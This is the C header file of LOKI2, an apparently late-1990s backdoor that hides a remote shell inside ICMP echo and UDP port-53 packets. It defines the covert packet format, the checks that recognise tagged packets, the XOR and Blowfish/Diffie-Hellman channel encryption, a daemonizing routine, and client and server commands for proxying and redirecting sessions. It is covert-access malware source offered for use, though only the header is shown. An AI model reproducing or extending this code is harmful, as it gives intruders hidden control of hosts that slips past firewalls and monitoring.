#ifndef  __LOKI_H__
#define  __LOKI_H__     

/*
 * LOKI
 *
 * loki header file
 *
 *  1996/7 Guild Corporation Productions    [daemon9]
 */
 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <pwd.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <time.h>
#include <grp.h>
#include <termios.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <setjmp.h>

#ifdef LINUX
#include <linux/icmp.h>
#include <linux/ip.h>
#include <linux/signal.h>
                                    /* BSDish nomenclature */
#define ip          iphdr
#define ip_v        version
#define ip_hl       ihl
#define ip_len      tot_len
#define ip_ttl      ttl
#define ip_p        protocol
#define ip_dst      daddr
#define ip_src      saddr
#endif

#ifdef BSD4 
#include <netinet/in_systm.h>
#include <netinet/ip_var.h>
#include <netinet/ip.h> 
#include <netinet/tcp.h>
#include <netinet/tcpip.h>
#include <netinet/ip_icmp.h>
#include <netinet/icmp_var.h>
#include <sys/sockio.h>
#include <sys/termios.h>
#include <sys/signal.h>

#undef  icmp_id
#undef  icmp_seq
#define ip_dst      ip_dst.s_addr
#define ip_src      ip_src.s_addr
#endif

#ifdef SOLARIS
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip_var.h>
#include <netinet/ip.h> 
#include <netinet/tcp.h>
#include <netinet/tcpip.h>
#include <netinet/ip_icmp.h>
#include <netinet/icmp_var.h>
#include <sys/sockio.h>
#include <sys/termios.h>
#include <sys/signal.h>
#include <strings.h>
#include <unistd.h> 

#undef  icmp_id
#undef  icmp_seq
#define ip_dst      ip_dst.s_addr
#define ip_src      ip_src.s_addr
#endif

#ifdef BROKEN_IP_LEN 
#define FIX_LEN(n)  (n)         /* FreeBSD needs this  */
#else
#define FIX_LEN(n)  htons(n)
#endif


/*
 *  Net/3 will not pass ICMP_ECHO packets to user processes. 
 */

#ifdef NET3 
#define D_P_TYPE    ICMP_ECHO
#define C_P_TYPE    ICMP_ECHOREPLY
#else
#define D_P_TYPE    ICMP_ECHOREPLY
#define C_P_TYPE    ICMP_ECHO
#endif

#ifdef STRONG_CRYPTO
#include "/usr/local/ssl/include/blowfish.h"
#include "/usr/local/ssl/include/bn.h"
#include "/usr/local/ssl/include/dh.h"
#include "/usr/local/ssl/include/buffer.h"

#define BF_KEYSIZE      16  /* blowfish key in bytes                    */
#define IVEC_SIZE       7   /* I grabbed this outta thin air.           */
#define BN2BIN_SIZE     48  /* bn2bin byte-size of 384-bit prime        */
#endif

#ifdef  STRONG_CRYPTO
#define CRYPTO_TYPE "blowfish"
#endif
#ifdef  WEAK_CRYPTO
#define CRYPTO_TYPE "XOR"
#endif
#ifdef  NO_CRYPTO 
#define CRYPTO_TYPE "none"
#endif


/* Start user configurable options */

#define MIN_TIMEOUT 3       /* minimum client-side alarm timeout        */
#define MAX_RETRAN  3       /* maximum client-side timeout/retry amount */
#define MAX_CLIENT  0xa     /* maximum server-side client count         */
#define KEY_TIMER   0xe10   /* maximum server-side idle client TTL      */

/* End user configurable options */



#define VERSION     "2.0"
#define BUFSIZE     0x38    /* We build packets with a fixed payload. 
                             * Fine for ICMP_ECHO/ECHOREPLY packets as they
                             * often default to a 56 byte payload.  However
                             * DNS query/reply packets have no set size and
                             * are generally oddly sized with no padding.
                             */

#define ICMPH_SIZE  8
#define UDPH_SIZE   8
#define NL_PORT     htons(0x35)

#define PROMPT      "loki> "
#define ENCR        1       /* symbolic for encrypt             */
#define DECR        0       /* symbolic for decrypt             */
#define NOCR        1       /* don't encrypt this packet        */
#define OKCR        0       /* encrypt this packet              */
#define OK          1       /* Positive acknowledgement         */
#define NOK         0       /* Negative acknowledgement         */
#define NNOK        -1      /* Really negative acknowledgement  */
#define FIND        1       /* Controls locate_client           */
#define DESTROY     2       /*  disposition                     */

/*  LOKI packet type symbolics */

#define L_TAG       0xf001  /* Tags packets as LOKI             */
#define L_PK_REQ    0xa1    /* Public Key request packet        */
#define L_PK_REPLY  0xa2    /* Public Key reply packet          */
#define L_EOK       0xa3    /* Encrypted ok                     */
#define L_REQ       0xb1    /* Standard reuqest packet          */
#define L_REPLY     0xb2    /* Standard reply packet            */
#define L_ERR       0xc1    /* Error of some kind               */
#define L_ACK       0xd1    /* Acknowledgement                  */
#define L_QUIT      0xd2    /* Receiver should exit             */
#define L_EOT       0xf1    /* End Of Transmission packet       */

/*  Packet type printing macro */

#ifdef DEBUG
#define PACKET_TYPE(ldg)\
\
if      (ldg.payload[0]   == 0xa1) fprintf(stderr, "Public Key Request\n"); \
else if (ldg.payload[0]   == 0xa2) fprintf(stderr, "Public Key Reply\n");   \
else if (ldg.payload[0]   == 0xa3) fprintf(stderr, "Encrypted OK\n");       \
else if (ldg.payload[0]   == 0xb1) fprintf(stderr, "Client Request\n");     \
else if (ldg.payload[0]   == 0xb2) fprintf(stderr, "Server Reply\n");       \
else if (ldg.payload[0]   == 0xc1) fprintf(stderr, "Error\n");              \
else if (ldg.payload[0]   == 0xd1) fprintf(stderr, "ACK\n");                \
else if (ldg.payload[0]   == 0xd2) fprintf(stderr, "QUIT\n");               \
else if (ldg.payload[0]   == 0xf1) fprintf(stderr, "Server EOT\n");         \
else                               fprintf(stderr, "Unknown\n");            \

#define DUMP_PACKET(ldg, i)\
\
if (prot == IPPROTO_ICMP) fprintf(stderr, "ICMP type: %d   ", ldg.ttype.icmph.icmp_type);\
for (i = 0; i < BUFSIZE; i++)      fprintf(stderr, "0x%x ",ldg.payload[i]); \
fprintf(stderr, "\n");\

#endif


/*  
 *  Escaped commands (not interpreted by the shell)
 */

#define HELP        "/help"         /* Help me                      */
#define TIMER       "/timer"        /* Change the client side timer */
#define QUIT_C      "/quit"         /* Quit the client              */
#define QUIT_ALL    "/quit all"     /* Kill all clients and server  */
#define STAT_C      "/stat"         /* Stat the client              */
#define STAT_ALL    "/stat all"     /* Stat all the clients         */
#define SWAP_T      "/swapt"        /* Swap protocols               */
#define REDIR_C     "/redirect"     /* Redirect to another client   */
#define PROXY_D     "/proxy"        /* Proxy to another server      */

/*
 *  Control flag symbolics 
 */

#define TERMINATE   0x01
#define TRAP        0x02
#define VALIDC      0x04
#define VALIDP      0x08
#define NEWTRANS    0x10
#define REDIRECT    0x20
#define PROXY       0x40
#define SENDKILL    0x80


/*
 *  Message Strings
 *  L_ == common to both server and client
 *  S_ == specific to server
 *  C_ == specific to client
 */

#define L_MSG_BANNER    "\nLOKI2\troute [(c) 1997 guild corporation worldwide]\n"
#define L_MSG_NOPRIV    "\n[fatal] invalid user identification value"
#define L_MSG_SOCKET    "[fatal] socket allocation error"
#define L_MSG_ICMPONLY  "\nICMP protocol only with strong cryptography\n"
#define L_MSG_ATEXIT    "[fatal] cannot register with atexit(2)"
#define L_MSG_DHKEYGEN  "generating Diffie-Hellman parameters and keypair"
#define L_MSG_DHKGFAIL  "\n[fatal] Diffie-Hellman key generation failure\n"
#define L_MSG_SIGALRM   "[fatal] cannot catch SIGALRM"
#define L_MSG_SIGUSR1   "[fatal] cannot catch SIGUSR1"
#define L_MSG_SIGCHLD   "[fatal] cannot catch SIGCHLD"
#define L_MSG_WIERDERR  "\n[SUPER fatal] control should NEVER fall here\n"
#define S_MSG_PACKED    "\nlokid: server is currently at capacity.  Try again later\n"
#define S_MSG_UNKNOWN   "\nlokid: cannot locate client entry in database\n"
#define S_MSG_UNSUP     "\nlokid: unsupported or unknown command string\n"
#define S_MSG_ICMPONLY  "\nlokid: ICMP protocol only with strong cryptography\n"
#define S_MSG_CLIENTK   "\nlokid: clean exit (killed at client request)\n"
#define S_MSG_DUP       "\nlokid: duplicate client entry found, updating\n" 
#define S_MSG_USAGE     "\nlokid -p (i|u) [ -v (0|1) ]\n"
#define C_MSG_USAGE     "\nloki -d dest -p (i|u) [ -v (0|1) ] [ -t (n>3) ]\n"
#define C_MSG_TIMEOUT   "\nloki: no response from server (expired timer)\n"
#define C_MSG_NOSWAP    "\nloki: cannot swap protocols with strong crypto\n"
#define C_MSG_PKREQ     "loki: requesting public from server\n" 
#define C_MSG_PKREC     "loki: received public key, computing shared secret\n"
#define C_MSG_SKSET     "loki: extracting and setting expanded blowfish key\n"
#define C_MSG_MUSTQUIT  "\nloki: received termination directive from server\n"

/*
 *  Macros to evaluate packets to determine if they are LOKI or not.
 *  These are UGLY.
 */


/*  
 *  ICMP_ECHO client packet check 
 */

#define IS_GOOD_ITYPE_C(ldg)\
\
(i_check((u_short *)&ldg.ttype.icmph, BUFSIZE + ICMPH_SIZE) ==          0 &&\
                                ldg.ttype.icmph.icmp_type   ==   D_P_TYPE &&\
                                  ldg.ttype.icmph.icmp_id   ==    loki_id &&\
                                 ldg.ttype.icmph.icmp_seq   ==      L_TAG &&\
                                          (ldg.payload[0]   ==    L_REPLY ||\
                                           ldg.payload[0]   == L_PK_REPLY ||\
                                           ldg.payload[0]   ==      L_EOT ||\
                                           ldg.payload[0]   ==     L_QUIT ||\
                                           ldg.payload[0]   ==    L_ERR)) ==\
                                                             (1) ? (1) : (0)\
/*  
 *  ICMP_ECHO daemon packet check 
 */

#define IS_GOOD_ITYPE_D(ldg)\
\
(i_check((u_short *)&ldg.ttype.icmph, BUFSIZE + ICMPH_SIZE) ==          0 &&\
                                ldg.ttype.icmph.icmp_type   ==   C_P_TYPE &&\
                                 ldg.ttype.icmph.icmp_seq   ==      L_TAG &&\
                                          (ldg.payload[0]   ==      L_REQ ||\
                                           ldg.payload[0]   ==     L_QUIT ||\
                                           ldg.payload[0]   == L_PK_REQ)) ==\
                                                             (1) ? (1) : (0)\
/*  
 *  UDP client packet check 
 */

#define IS_GOOD_UTYPE_C(ldg)\
\
(i_check((u_short *)&ldg.ttype.udph, BUFSIZE + UDPH_SIZE) ==              0 &&\
                                ldg.ttype.udph.uh_sport   ==        NL_PORT &&\
                                ldg.ttype.udph.uh_dport   == loki_id &&\
                                        (ldg.payload[0]   ==        L_REPLY ||\
                                         ldg.payload[0]   ==          L_EOT ||\
                                         ldg.payload[0]   ==         L_QUIT ||\
                                         ldg.payload[0]   ==        L_ERR)) ==\
                                                               (1) ? (1) : (0)\
/*  
 *  UDP daemon packet check.  Yikes.  We need more info here. 
 */

#define IS_GOOD_UTYPE_D(ldg)\
\
(i_check((u_short *)&ldg.ttype.udph, BUFSIZE + UDPH_SIZE) ==              0 &&\
                                ldg.ttype.udph.uh_dport   ==        NL_PORT &&\
                                         (ldg.payload[0]  ==         L_QUIT ||\
                                          ldg.payload[0]  ==        L_REQ)) ==\
                                                               (1) ? (1) : (0)\
/*
 *  ICMP_ECHO / ICMP_ECHOREPLY header prototype
 */

struct icmp_echo
{
    u_char  icmp_type;          /* 1 byte type              */
    u_char  icmp_code;          /* 1 byte code              */
    u_short icmp_cksum;         /* 2 byte checksum          */
    u_short icmp_id;            /* 2 byte identification    */
    u_short icmp_seq;           /* 2 byte sequence number   */
};


/*
 *  UDP header prototype
 */

struct udp
{
    u_short uh_sport;           /* 2 byte source port       */
    u_short uh_dport;           /* 2 byte destination port  */
    u_short uh_ulen;            /* 2 byte length            */
    u_short uh_sum;             /* 2 byte checksum          */
};
        

/*
 *  LOKI packet prototype
 */

struct loki
{
    struct ip iph;              /* IP header    */
    union
    {
        struct icmp_echo icmph; /* ICMP header  */
        struct udp udph;        /* UDP header   */
    }ttype;
    u_char payload[BUFSIZE];    /* data payload */
};

#define LOKIP_SIZE      sizeof(struct loki)
#define LP_DST          rdg.iph.ip_src

void blur(int, int, u_char *);          /* Symmetric encryption function    */
char *host_lookup(u_long);              /* network byte -> human readable   */
u_long name_resolve(char *);            /* human readable -> network byte   */
u_short i_check(u_short *, int);        /* Ah yes, the IP family checksum   */
int c_parse(u_char *, int *);           /* parse escaped commands [client]  */
void d_parse(u_char *, pid_t, int);     /* parse escaped commands [server]  */
                                        /* build and transmit LOKI packets  */
void loki_xmit(u_char *, u_short, int, struct sockaddr_in, int);
int lokid_xmit(u_char *, u_long, int, int);
void err_exit(int, int, int, char *);   /* handle exit with reason          */
void clean_exit(int);                   /* exit cleanly                     */
void help();                            /* lala                             */
void shadow();                          /* daemonizing routine              */
void swap_t(int);                       /* swap protocols [server-side]     */
void reaper(int);                       /* prevent zombies                  */
void catch_timeout(int);                /* ALARM signal catcher             */
void client_expiry_check();             /* expire client from shm           */
void prep_shm();                        /* Prepare shm ans semaphore        */
void dump_shm();                        /* detach shm                       */
void packets_read();                    /* packets read (client)            */
void fd_status(int, int);               /* dumps fd stats                   */
#ifdef PTY
int ptym_open(char *);
int ptys_open(int, char *);
pid_t pty_fork(int *, char *, struct termios *, struct winsize *);
#endif
#ifdef STRONG_CRYPTO
DH* generate_dh_keypair();              /* generate DH params and keypair   */
u_char *extract_bf_key(u_char *, int);  /* extract and md5 and set bf key   */
#endif

#endif  /* __LOKI_H__ */

